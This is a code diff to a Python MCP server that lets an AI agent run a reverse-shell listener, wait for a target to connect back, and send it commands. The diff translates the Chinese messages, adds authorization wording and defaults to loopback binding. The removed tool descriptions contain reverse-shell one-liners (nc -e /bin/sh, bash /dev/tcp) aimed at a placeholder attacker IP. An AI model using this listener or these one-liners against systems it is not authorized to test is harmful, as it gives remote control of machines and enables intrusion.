@@ -1,17 +1,15 @@
 #!/usr/bin/env python3
-"""
-Reverse Shell MCP Server - 反向 Shell MCP 服务
-
-通过 MCP 协议暴露反向 Shell 能力：开启/停止监听、与已连接客户端交互执行命令。
-无需修改 CyberStrikeAI 后端，在「设置 → 外部 MCP」中以 stdio 方式添加即可。
-
-依赖：pip install mcp（或使用项目 venv）
-运行：python mcp_reverse_shell.py  或  python3 mcp_reverse_shell.py
+"""Optional reverse-shell MCP server for an authorized operator.
+Starts/stops one TCP listener and exchanges commands with one connected client.
+Requires mcp. Configure it explicitly as a stdio MCP server; it is not enabled
+by importing the CyberStrikeAI application and it is not an execution sandbox.
 """
 
 from __future__ import annotations
 
 import asyncio
+import ipaddress
+import os
 import socket
 import threading
 import time
@@ -26,6 +24,7 @@ from mcp.server.fastmcp import FastMCP
 _LISTENER: socket.socket | None = None
 _LISTENER_THREAD: threading.Thread | None = None
 _LISTENER_PORT: int | None = None
+_LISTENER_HOST: str | None = None
 _CLIENT_SOCK: socket.socket | None = None
 _CLIENT_ADDR: tuple[str, int] | None = None
 _LOCK = threading.Lock()
@@ -42,7 +41,7 @@ _RECV_CHUNK = 4096
 
 
 def _get_local_ips() -> list[str]:
-    """获取本机 IP 列表（供目标机反弹连接用），优先非 127 地址。"""
+    'Get local callback-address candidates, preferring non-loopback addresses.'
     ips: list[str] = []
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -65,20 +64,21 @@ def _get_local_ips() -> list[str]:
     return ips
 
 
-def _accept_loop(port: int) -> None:
-    """在后台线程中：bind、listen、accept，只接受一个客户端。"""
-    global _LISTENER, _CLIENT_SOCK, _CLIENT_ADDR, _LISTENER_PORT, _LAST_LISTEN_ERROR
+def _accept_loop(port: int, bind_host: str) -> None:
+    'Bind/listen/accept in a background thread; accept one client.'
+    global _LISTENER, _CLIENT_SOCK, _CLIENT_ADDR, _LISTENER_PORT, _LISTENER_HOST, _LAST_LISTEN_ERROR
     sock: socket.socket | None = None
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        sock.bind(("0.0.0.0", port))
+        sock.bind((bind_host, port))
         sock.listen(1)
         # 避免 stop_listener 关闭后 accept() 长时间不返回：用超时轮询检查停止事件
         sock.settimeout(0.5)
         with _LOCK:
             _LISTENER = sock
             _LISTENER_PORT = port
+            _LISTENER_HOST = bind_host
             _LAST_LISTEN_ERROR = None
             _READY_EVENT.set()
         # 循环 accept：只接受一个连接，或等待 stop 事件
@@ -101,6 +101,7 @@ def _accept_loop(port: int) -> None:
         with _LOCK:
             _LISTENER = None
             _LISTENER_PORT = None
+            _LISTENER_HOST = None
         if sock is not None:
             try:
                 sock.close()
@@ -108,14 +109,14 @@ def _accept_loop(port: int) -> None:
                 pass
 
 
-def _start_listener(port: int) -> str:
+def _start_listener(port: int, bind_host: str = "127.0.0.1") -> str:
     global _LISTENER_THREAD, _LISTENER_PORT, _CLIENT_SOCK, _CLIENT_ADDR, _LAST_LISTEN_ERROR
     old_thread: threading.Thread | None = None
     with _LOCK:
         if _LISTENER is not None:
             # _LISTENER_PORT 可能短暂为 None（例如刚 stop/start），因此做个兜底显示
             show_port = _LISTENER_PORT if _LISTENER_PORT is not None else port
-            return f"已在监听中（端口: {show_port}），请先 stop_listener 再重新 start。"
+            return f"Already listening on port {show_port}. Stop the listener before starting another."
         if _CLIENT_SOCK is not None:
             try:
                 _CLIENT_SOCK.close()
@@ -132,7 +133,7 @@ def _start_listener(port: int) -> str:
     _STOP_EVENT.clear()
     _READY_EVENT.clear()
     _LAST_LISTEN_ERROR = None
-    th = threading.Thread(target=_accept_loop, args=(port,), daemon=True)
+    th = threading.Thread(target=_accept_loop, args=(port, bind_host), daemon=True)
     th.start()
     _LISTENER_THREAD = th
 
@@ -143,22 +144,22 @@ def _start_listener(port: int) -> str:
         listening = _LISTENER is not None
 
     if listening:
-        ips = _get_local_ips()
+        ips = _get_local_ips() if bind_host == "0.0.0.0" else [bind_host]
         addrs = ", ".join(f"{ip}:{port}" for ip in ips)
         return (
-            f"已在 0.0.0.0:{port} 开始监听。"
-            f"目标机请反弹到: {addrs}（任选其一）。连接后使用 reverse_shell_send_command 执行命令。"
+            f"Listening on {bind_host}:{port}. Plaintext and unauthenticated; restrict the network. "
+            f"Authorized target callback addresses: {addrs}. After connection, use reverse_shell_send_command for scoped commands."
         )
 
     if err:
-        return f"启动监听失败（0.0.0.0:{port}）：{err}"
+        return f"Failed to listen on {bind_host}:{port}: {err}"
 
     # 仍未准备好：可能线程调度较慢或环境异常；给出可操作的提示
-    return f"启动监听未确认成功（0.0.0.0:{port}）。请调用 reverse_shell_status 确认，或稍后重试。"
+    return f"Listener on {bind_host}:{port} is not ready. Check reverse_shell_status or retry later."
 
 
 def _stop_listener() -> str:
-    global _LISTENER, _LISTENER_THREAD, _CLIENT_SOCK, _CLIENT_ADDR, _LISTENER_PORT
+    global _LISTENER, _LISTENER_THREAD, _CLIENT_SOCK, _CLIENT_ADDR, _LISTENER_PORT, _LISTENER_HOST
     listener_sock: socket.socket | None = None
     client_sock: socket.socket | None = None
     old_thread: threading.Thread | None = None
@@ -169,6 +170,7 @@ def _stop_listener() -> str:
         old_thread = _LISTENER_THREAD
         _LISTENER = None
         _LISTENER_PORT = None
+        _LISTENER_HOST = None
         client_sock = _CLIENT_SOCK
         _CLIENT_SOCK = None
         _CLIENT_ADDR = None
@@ -189,14 +191,14 @@ def _stop_listener() -> str:
         old_thread.join(timeout=_LISTENER_THREAD_JOIN_TIMEOUT)
     with _LOCK:
         _LISTENER_THREAD = None
-    return "监听已停止，已断开当前客户端（如有）。"
+    return 'Listener stopped; the current client, if any, was disconnected.'
 
 
 def _disconnect_client() -> str:
     global _CLIENT_SOCK, _CLIENT_ADDR
     with _LOCK:
         if _CLIENT_SOCK is None:
-            return "当前无已连接客户端。"
+            return 'No client currently connected.'
         try:
             _CLIENT_SOCK.close()
         except OSError:
@@ -204,22 +206,24 @@ def _disconnect_client() -> str:
         addr = _CLIENT_ADDR
         _CLIENT_SOCK = None
         _CLIENT_ADDR = None
-    return f"已断开客户端 {addr}。"
+    return f"Disconnected client {addr}."
 
 
 def _status() -> dict[str, Any]:
     with _LOCK:
         listening = _LISTENER is not None
         port = _LISTENER_PORT
+        bind_host = _LISTENER_HOST
         connected = _CLIENT_SOCK is not None
         addr = _CLIENT_ADDR
     connect_back = None
     if listening and port is not None:
-        ips = _get_local_ips()
+        ips = _get_local_ips() if bind_host == "0.0.0.0" else [bind_host or "127.0.0.1"]
         connect_back = [f"{ip}:{port}" for ip in ips]
     return {
         "listening": listening,
         "port": port,
+        "bind_host": bind_host,
         "connect_back": connect_back,
         "connected": connected,
         "client_address": f"{addr[0]}:{addr[1]}" if addr else None,
@@ -227,12 +231,12 @@ def _status() -> dict[str, Any]:
 
 
 def _send_command_blocking(command: str, timeout: float = _RECV_TIMEOUT) -> str:
-    """在同步上下文中向已连接客户端发送命令并读取输出（带结束标记）。"""
+    'Send command and read output to connected client in sync context (Bring End Marks) .'
     global _CLIENT_SOCK, _CLIENT_ADDR
     with _LOCK:
         client = _CLIENT_SOCK
     if client is None:
-        return "错误：当前无已连接客户端。请先 start_listener，等待目标连接后再 send_command。"
+        return 'Error: no client connected. Start the listener and wait for an authorized target connection before sending commands.'
     # 使用结束标记以便可靠地截断输出
     wrapped = f"{command.strip()}\necho {_END_MARKER}\n"
     try:
@@ -252,15 +256,15 @@ def _send_command_blocking(command: str, timeout: float = _RECV_TIMEOUT) -> str:
         text = data.decode("utf-8", errors="replace")
         if _END_MARKER in text:
             text = text.split(_END_MARKER)[0].strip()
-        return text or "(无输出)"
+        return text or '(No output)'
     except (ConnectionResetError, BrokenPipeError, OSError) as e:
         with _LOCK:
             if _CLIENT_SOCK is client:
                 _CLIENT_SOCK = None
                 _CLIENT_ADDR = None
-        return f"连接已断开: {e}"
+        return f"Connection disconnected: {e}"
     except Exception as e:
-        return f"执行异常: {e}"
+        return f"Execution exception: {e}"
 
 
 # ---------------------------------------------------------------------------
@@ -269,22 +273,27 @@ def _send_command_blocking(command: str, timeout: float = _RECV_TIMEOUT) -> str:
 
 app = FastMCP(
     name="reverse-shell",
-    instructions="反向 Shell MCP：在本地开启 TCP 监听，等待目标机连接后通过工具执行命令。",
+    instructions='Optional privileged reverse-shell MCP: create a local TCP listener, wait for an authorized target connection and exchange commands. The outer tool gate does not sandbox the connected client or child OS authority.',
 )
 
 
 @app.tool(
-    description="在指定端口启动反向 Shell 监听。目标机需执行反向连接（如 nc -e /bin/sh YOUR_IP PORT 或 bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1）。仅支持一个监听器与一个客户端。",
+    description='Start one TCP reverse-shell listener on the specified port. The target callback must be separately authorized. Defaults to loopback (127.0.0.1). An explicit bind_host or configured REVERSE_SHELL_BIND_HOST can select an authorized IPv4 interface; 0.0.0.0 deliberately exposes all interfaces. Supports one listener/client; plaintext, no implant authentication.',
 )
-def reverse_shell_start_listener(port: int) -> str:
+def reverse_shell_start_listener(port: int, bind_host: str | None = None) -> str:
     """Start reverse shell listener on the given port (e.g. 4444)."""
     if port < 1 or port > 65535:
-        return "端口需在 1–65535 之间。"
-    return _start_listener(port)
+        return 'Port must be between 1 and 65535.'
+    host = bind_host if bind_host is not None else os.environ.get("REVERSE_SHELL_BIND_HOST", "127.0.0.1")
+    try:
+        host = str(ipaddress.IPv4Address(host))
+    except (ipaddress.AddressValueError, TypeError):
+        return "bind_host must be an IPv4 interface address (default 127.0.0.1; explicit 0.0.0.0 opts into all interfaces)."
+    return _start_listener(port, host)
 
 
 @app.tool(
-    description="停止反向 Shell 监听并断开当前客户端。",
+    description='Stop the reverse-shell listener and disconnect the current client.',
 )
 def reverse_shell_stop_listener() -> str:
     """Stop the listener and disconnect the current client."""
@@ -292,23 +301,24 @@ def reverse_shell_stop_listener() -> str:
 
 
 @app.tool(
-    description="查看当前状态：是否在监听、端口、是否有客户端连接及客户端地址。",
+    description='Return listener state/port and current client connection/address.',
 )
 def reverse_shell_status() -> str:
     """Get listener and client connection status."""
     s = _status()
     lines = [
-        f"监听中: {s['listening']}",
-        f"端口: {s['port']}",
-        f"反弹地址(目标机连接): {', '.join(s['connect_back']) if s.get('connect_back') else '-'}",
-        f"已连接: {s['connected']}",
-        f"客户端: {s['client_address'] or '-'}",
+        f"Listening: {s['listening']}",
+        f"Port: {s['port']}",
+        f"Bind host: {s['bind_host'] or '-'}",
+        f"Callback addresses (authorized target): {', '.join(s['connect_back']) if s.get('connect_back') else '-'}",
+        f"Connected: {s['connected']}",
+        f"Client: {s['client_address'] or '-'}",
     ]
     return "\n".join(lines)
 
 
 @app.tool(
-    description="向已连接的反向 Shell 客户端发送一条命令并返回输出。若无连接请先 start_listener 并等待目标连接。",
+    description="Send an authorized command to the connected reverse-shell client and return output. Requires an existing client connection.",
 )
 async def reverse_shell_send_command(command: str) -> str:
     """Send a command to the connected reverse shell client and return output."""
@@ -317,7 +327,7 @@ async def reverse_shell_send_command(command: str) -> str:
 
 
 @app.tool(
-    description="仅断开当前客户端连接，不停止监听（可继续等待新连接）。",
+    description="Disconnect the current client while leaving the listener open for another authorized connection.",
 )
 def reverse_shell_disconnect() -> str:
     """Disconnect the current client without stopping the listener."""
